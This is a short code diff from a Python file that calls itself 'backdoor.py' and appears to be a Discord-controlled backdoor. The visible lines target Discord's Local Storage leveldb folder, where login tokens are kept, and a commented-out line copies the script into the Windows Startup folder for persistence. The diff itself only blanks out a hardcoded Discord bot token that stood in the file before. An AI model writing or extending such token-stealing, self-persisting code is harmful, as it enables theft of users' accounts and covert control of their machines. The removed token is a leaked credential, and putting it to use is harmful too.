@@ -20,7 +20,7 @@ Username = os.getenv("COMPUTERNAME")
 dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
 # shutil.copy("backdoor.py", fr"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 
-BotToken = "ODA5ODcwODk4MzY2NTEzMjUz.YCbZDA.K_bzQq-CN2PfjedL6VUZ-zvmUsw"
+BotToken = ""
 
 client = commands.Bot(command_prefix="!!")
 client.remove_command("help")
